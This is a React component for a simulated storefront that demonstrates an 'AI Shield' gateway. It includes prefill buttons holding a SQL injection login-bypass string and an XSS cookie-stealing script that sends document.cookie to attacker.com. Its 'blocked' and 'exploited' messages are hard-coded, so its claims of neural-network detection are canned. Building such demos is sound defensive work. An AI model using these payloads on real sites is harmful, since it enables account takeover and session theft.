'use client';

import React, { useState } from 'react';
import {
  ShoppingBag,
  ShoppingCart,
  LogIn,
  Search,
  Shield,
  AlertOctagon,
  ArrowRight,
  MessageSquare,
} from 'lucide-react';
import { INITIAL_PRODUCTS, INITIAL_REVIEWS } from '../lib/mockData';
import { executeSimulatedRequest } from '../lib/api';
import { Product, ProductReview } from '../lib/types';

export default function StorefrontPreview() {
  const [currentPage, setCurrentPage] = useState<'store' | 'login'>('store');
  const [useShield, setUseShield] = useState<boolean>(true);
  const [activeCategory, setActiveCategory] = useState<string>('all');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [cart, setCart] = useState<{ product: Product; quantity: number }[]>([]);
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);

  // Login state
  const [username, setUsername] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [loginNotification, setLoginNotification] = useState<{
    type: 'success' | 'error' | 'shield_blocked';
    message: string;
    details?: string;
  } | null>(null);

  // Review state
  const [newReviewText, setNewReviewText] = useState<string>('');
  const [newReviewRating, setNewReviewRating] = useState<number>(5);
  const [reviewNotification, setReviewNotification] = useState<{
    type: 'success' | 'shield_blocked';
    message: string;
  } | null>(null);

  const filteredProducts = INITIAL_PRODUCTS.filter((p) => {
    if (activeCategory !== 'all' && p.category !== activeCategory) return false;
    if (searchQuery.trim() && !p.name.toLowerCase().includes(searchQuery.toLowerCase())) {
      return false;
    }
    return true;
  });

  const addToCart = (product: Product) => {
    setCart((prev) => {
      const existing = prev.find((item) => item.product.id === product.id);
      if (existing) {
        return prev.map((item) =>
          item.product.id === product.id ? { ...item, quantity: item.quantity + 1 } : item
        );
      }
      return [...prev, { product, quantity: 1 }];
    });
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginNotification(null);

    const isSqlInjection = username.includes("' OR '1'='1'") || password.includes("' OR '1'='1'");

    const res = await executeSimulatedRequest(
      '/api/login',
      'POST',
      { username, password },
      useShield
    );

    if (useShield && isSqlInjection) {
      setLoginNotification({
        type: 'shield_blocked',
        message: '403 FORBIDDEN — BLOCKED BY AI GATEWAY SHIELD',
        details: 'Deep Autoencoder & CNN+BiLSTM detected SQL syntax injection in the login vector. IP flagged.',
      });
    } else if (!useShield && isSqlInjection) {
      setLoginNotification({
        type: 'error',
        message: '🚨 CRITICAL VULNERABILITY EXPLOITED! (Auth Bypass Succeeded)',
        details: 'PostgreSQL evaluated: WHERE username = \'admin\' OR \'1\'=\'1\' -- and authenticated with Administrator privileges without password!',
      });
    } else if (username === 'user1' && password === 'password123') {
      setLoginNotification({
        type: 'success',
        message: 'Legitimate customer login successful. Welcome user1!',
      });
    } else {
      setLoginNotification({
        type: 'error',
        message: 'Invalid credentials. Please verify your login.',
      });
    }
  };

  const handleReviewSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newReviewText.trim() || !selectedProduct) return;

    const isXss = newReviewText.includes('<script');

    const res = await executeSimulatedRequest(
      `/api/products/${selectedProduct.id}/reviews`,
      'POST',
      { rating: newReviewRating, comment: newReviewText },
      useShield
    );

    if (useShield && isXss) {
      setReviewNotification({
        type: 'shield_blocked',
        message: '403 FORBIDDEN — XSS Vector Intercepted and Dropped by Shield.',
      });
    } else {
      const added: ProductReview = {
        id: Date.now(),
        product_id: selectedProduct.id,
        user_id: 99,
        username: 'Guest_User',
        rating: newReviewRating,
        comment: newReviewText,
        created_at: new Date().toLocaleTimeString(),
      };
      setReviews((prev) => [added, ...prev]);
      setNewReviewText('');
      setReviewNotification({
        type: 'success',
        message: isXss
          ? '🚨 Stored XSS script executed into page DOM (Unprotected Backend)!'
          : 'Review successfully submitted.',
      });
    }
  };

  return (
    <div className="white-card">
      {/* Route Switcher & Storefront Banner */}
      <div
        style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          flexWrap: 'wrap',
          gap: '1rem',
          paddingBottom: '1.25rem',
          marginBottom: '1.25rem',
          borderBottom: '1px solid var(--border-light)',
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.85rem' }}>
          <div
            style={{
              width: '40px',
              height: '40px',
              borderRadius: 'var(--radius-md)',
              background: 'var(--pastel-blue)',
              color: '#0284c7',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <ShoppingBag size={20} />
          </div>

          <div>
            <h2 style={{ fontSize: '1.15rem', color: 'var(--text-primary)', fontWeight: 700 }}>
              Victim Storefront — Aurora Boutique (:8081)
            </h2>
            <span style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>
              2-Page E-Commerce Demonstration • Live Target Application
            </span>
          </div>
        </div>

        {/* Protection Mode Toggle */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
          <span
            className="hub-badge"
            style={{
              background: useShield ? '#dcfce7' : '#fee2e2',
              color: useShield ? '#16a34a' : '#dc2626',
            }}
          >
            {useShield ? <Shield size={13} /> : <AlertOctagon size={13} />}
            <span>{useShield ? 'VIA AI SHIELD (:8080)' : 'DIRECT UNPROTECTED (:8081)'}</span>
          </span>

          <button
            className={useShield ? 'hub-btn-danger' : 'hub-btn-primary'}
            onClick={() => setUseShield(!useShield)}
            style={{ fontSize: '0.76rem', padding: '0.4rem 0.85rem' }}
          >
            {useShield ? 'Disable Shield (Direct Target)' : 'Activate AI Shield Gateway'}
          </button>
        </div>
      </div>

      {/* Store Navigation Bar */}
      <div
        style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          flexWrap: 'wrap',
          gap: '1rem',
          marginBottom: '1.5rem',
          background: '#f8fafc',
          padding: '0.75rem 1rem',
          borderRadius: 'var(--radius-lg)',
          border: '1px solid var(--border-light)',
        }}
      >
        <div style={{ display: 'flex', gap: '0.5rem' }}>
          <button
            className={`select-pill ${currentPage === 'store' ? 'active' : ''}`}
            onClick={() => setCurrentPage('store')}
            style={{
              background: currentPage === 'store' ? 'var(--accent-cyan-light)' : '#ffffff',
              color: currentPage === 'store' ? 'var(--accent-cyan)' : 'var(--text-secondary)',
              fontWeight: currentPage === 'store' ? 600 : 400,
            }}
          >
            <ShoppingBag size={14} />
            <span>Storefront Catalog</span>
          </button>

          <button
            className={`select-pill ${currentPage === 'login' ? 'active' : ''}`}
            onClick={() => setCurrentPage('login')}
            style={{
              background: currentPage === 'login' ? 'var(--accent-cyan-light)' : '#ffffff',
              color: currentPage === 'login' ? 'var(--accent-cyan)' : 'var(--text-secondary)',
              fontWeight: currentPage === 'login' ? 600 : 400,
            }}
          >
            <LogIn size={14} />
            <span>Customer Authentication / Login</span>
          </button>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
          {currentPage === 'store' && (
            <input
              type="text"
              placeholder="Search products..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="hub-search-input"
              style={{ width: '190px', padding: '0.45rem 0.85rem' }}
            />
          )}

          <div className="select-pill" style={{ background: '#ffffff', color: 'var(--text-primary)', fontWeight: 600 }}>
            <ShoppingCart size={14} color="#0284c7" />
            <span>Cart: {cart.reduce((a, b) => a + b.quantity, 0)} items</span>
          </div>
        </div>
      </div>

      {/* PAGE 1: CATALOG VIEW */}
      {currentPage === 'store' && (
        <div>
          {/* Category Filters */}
          <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1.25rem', flexWrap: 'wrap' }}>
            {['all', 'electronics', 'clothing', 'books', 'home'].map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat)}
                className="select-pill"
                style={{
                  background: activeCategory === cat ? 'var(--accent-cyan-light)' : '#f8fafc',
                  color: activeCategory === cat ? 'var(--accent-cyan)' : 'var(--text-secondary)',
                  fontWeight: activeCategory === cat ? 600 : 400,
                  textTransform: 'capitalize',
                }}
              >
                {cat}
              </button>
            ))}
          </div>

          {/* Product Grid */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: '1.25rem' }}>
            {filteredProducts.map((p) => (
              <div
                key={p.id}
                style={{
                  background: '#f8fafc',
                  border: '1px solid var(--border-light)',
                  borderRadius: 'var(--radius-lg)',
                  padding: '1.25rem',
                  display: 'flex',
                  flexDirection: 'column',
                  justifyContent: 'space-between',
                }}
              >
                <div>
                  <div
                    style={{
                      height: '110px',
                      background: '#ffffff',
                      borderRadius: 'var(--radius-md)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '3rem',
                      marginBottom: '0.85rem',
                    }}
                  >
                    {p.image}
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
                    <h4 style={{ fontSize: '0.92rem', fontWeight: 600, color: 'var(--text-primary)' }}>
                      {p.name}
                    </h4>
                    <span className="font-mono" style={{ color: '#16a34a', fontWeight: 700, fontSize: '0.92rem' }}>
                      ${p.price.toFixed(2)}
                    </span>
                  </div>

                  <p style={{ fontSize: '0.74rem', color: 'var(--text-secondary)', lineHeight: 1.4, marginBottom: '0.75rem' }}>
                    {p.description}
                  </p>
                </div>

                <div style={{ display: 'flex', gap: '0.5rem', marginTop: '0.75rem' }}>
                  <button
                    className="hub-btn-primary"
                    style={{ flex: 1, padding: '0.45rem 0.65rem', justifyContent: 'center' }}
                    onClick={() => addToCart(p)}
                  >
                    <ShoppingCart size={13} />
                    <span>Add to Cart</span>
                  </button>

                  <button
                    className="hub-btn-secondary"
                    style={{ padding: '0.45rem 0.65rem' }}
                    onClick={() => setSelectedProduct(p)}
                    title="Reviews & feedback"
                  >
                    <MessageSquare size={13} />
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* PAGE 2: LOGIN VIEW (With SQLi Demo Sandbox) */}
      {currentPage === 'login' && (
        <div style={{ maxWidth: '480px', margin: '0 auto', padding: '1rem 0' }}>
          <div
            style={{
              background: '#f8fafc',
              border: '1px solid var(--border-light)',
              borderRadius: 'var(--radius-xl)',
              padding: '2rem',
            }}
          >
            <h3 style={{ fontSize: '1.25rem', color: 'var(--text-primary)', marginBottom: '0.35rem', textAlign: 'center' }}>
              Aurora Boutique Sign In
            </h3>
            <p style={{ fontSize: '0.76rem', color: 'var(--text-muted)', textAlign: 'center', marginBottom: '1.5rem' }}>
              Authentication endpoint: <span className="font-mono" style={{ color: '#0284c7' }}>POST /api/login</span>
            </p>

            {/* Quick Demo Pre-fill */}
            <div
              style={{
                marginBottom: '1.25rem',
                padding: '0.85rem',
                background: '#ffffff',
                border: '1px solid var(--border-light)',
                borderRadius: 'var(--radius-md)',
              }}
            >
              <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginBottom: '0.45rem', textTransform: 'uppercase' }}>
                Quick Demo Scenario Fill:
              </div>
              <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
                <button
                  type="button"
                  className="hub-btn-secondary"
                  style={{ fontSize: '0.72rem', padding: '0.3rem 0.65rem' }}
                  onClick={() => {
                    setUsername('user1');
                    setPassword('password123');
                  }}
                >
                  👤 Legitimate Customer (user1)
                </button>

                <button
                  type="button"
                  className="hub-btn-danger"
                  style={{ fontSize: '0.72rem', padding: '0.3rem 0.65rem' }}
                  onClick={() => {
                    setUsername("admin' OR '1'='1' --");
                    setPassword('anything');
                  }}
                >
                  ⚡ SQLi Auth Bypass (admin&apos; OR &apos;1&apos;=&apos;1&apos; --)
                </button>
              </div>
            </div>

            <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
              <div>
                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-secondary)', marginBottom: '0.35rem' }}>
                  Username / Identifier
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="e.g. admin' OR '1'='1' --"
                  className="hub-search-input font-mono"
                  style={{ width: '100%', paddingLeft: '1rem' }}
                  required
                />
              </div>

              <div>
                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-secondary)', marginBottom: '0.35rem' }}>
                  Password
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter password"
                  className="hub-search-input font-mono"
                  style={{ width: '100%', paddingLeft: '1rem' }}
                  required
                />
              </div>

              <button
                type="submit"
                className={useShield ? 'hub-btn-primary' : 'hub-btn-danger'}
                style={{ padding: '0.65rem', justifyContent: 'center', marginTop: '0.5rem' }}
              >
                <span>{useShield ? 'Sign In through AI Shield (:8080)' : 'Submit Direct to Backend (:8081)'}</span>
                <ArrowRight size={14} />
              </button>
            </form>

            {loginNotification && (
              <div
                style={{
                  marginTop: '1.25rem',
                  padding: '0.85rem',
                  borderRadius: 'var(--radius-md)',
                  background:
                    loginNotification.type === 'shield_blocked'
                      ? '#ecfdf5'
                      : loginNotification.type === 'success'
                      ? '#f0f9ff'
                      : '#fef2f2',
                  border: `1px solid ${
                    loginNotification.type === 'shield_blocked'
                      ? '#10b981'
                      : loginNotification.type === 'success'
                      ? '#0284c7'
                      : '#ef4444'
                  }`,
                }}
              >
                <div
                  style={{
                    fontWeight: 700,
                    fontSize: '0.82rem',
                    color:
                      loginNotification.type === 'shield_blocked'
                        ? '#16a34a'
                        : loginNotification.type === 'success'
                        ? '#0284c7'
                        : '#dc2626',
                    marginBottom: '0.25rem',
                  }}
                >
                  {loginNotification.message}
                </div>
                {loginNotification.details && (
                  <p style={{ fontSize: '0.74rem', color: 'var(--text-secondary)', lineHeight: 1.4 }}>
                    {loginNotification.details}
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Review Modal */}
      {selectedProduct && (
        <div className="hub-modal-overlay" onClick={() => setSelectedProduct(null)}>
          <div className="hub-modal-card" style={{ maxWidth: '580px' }} onClick={(e) => e.stopPropagation()}>
            <h3 style={{ fontSize: '1.1rem', color: 'var(--text-primary)', marginBottom: '0.25rem' }}>
              Customer Reviews — {selectedProduct.name}
            </h3>
            <p style={{ fontSize: '0.74rem', color: 'var(--text-muted)', marginBottom: '1rem' }}>
              Endpoint: <span className="font-mono" style={{ color: '#0284c7' }}>POST /api/products/{selectedProduct.id}/reviews</span>
            </p>

            <form onSubmit={handleReviewSubmit} style={{ marginBottom: '1.25rem' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                <label style={{ fontSize: '0.74rem', color: 'var(--text-secondary)' }}>Write a Review</label>
                <button
                  type="button"
                  className="hub-btn-danger"
                  style={{ fontSize: '0.68rem', padding: '2px 8px' }}
                  onClick={() =>
                    setNewReviewText(
                      "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Great gear!"
                    )
                  }
                >
                  ⚡ Paste XSS Cookie Stealer
                </button>
              </div>

              <textarea
                value={newReviewText}
                onChange={(e) => setNewReviewText(e.target.value)}
                placeholder="Share customer review or test XSS payload..."
                rows={3}
                className="hub-search-input font-mono"
                style={{ width: '100%', padding: '0.65rem', borderRadius: 'var(--radius-md)', resize: 'vertical' }}
                required
              />

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '0.65rem' }}>
                <button
                  type="submit"
                  className={useShield ? 'hub-btn-primary' : 'hub-btn-danger'}
                >
                  <span>{useShield ? 'Submit Review through Shield' : 'Submit Direct (Vulnerable)'}</span>
                </button>

                <button type="button" className="hub-btn-secondary" onClick={() => setSelectedProduct(null)}>
                  Close
                </button>
              </div>
            </form>

            {reviewNotification && (
              <div
                style={{
                  padding: '0.65rem 0.85rem',
                  borderRadius: 'var(--radius-sm)',
                  marginBottom: '1rem',
                  background: reviewNotification.type === 'shield_blocked' ? '#ecfdf5' : '#fef2f2',
                  border: `1px solid ${reviewNotification.type === 'shield_blocked' ? '#10b981' : '#ef4444'}`,
                  color: reviewNotification.type === 'shield_blocked' ? '#16a34a' : '#dc2626',
                  fontSize: '0.76rem',
                  fontWeight: 600,
                }}
              >
                {reviewNotification.message}
              </div>
            )}

            <div style={{ maxHeight: '220px', overflowY: 'auto' }}>
              {reviews.map((r) => (
                <div
                  key={r.id}
                  style={{
                    padding: '0.75rem',
                    background: '#f8fafc',
                    borderRadius: 'var(--radius-sm)',
                    marginBottom: '0.5rem',
                    border: '1px solid var(--border-light)',
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
                    <span style={{ fontSize: '0.8rem', fontWeight: 600 }}>{r.username || 'Customer'}</span>
                    <span style={{ color: '#eab308', fontSize: '0.75rem' }}>{'★'.repeat(r.rating)}</span>
                  </div>
                  <p style={{ color: 'var(--text-secondary)', fontSize: '0.76rem' }}>{r.comment}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
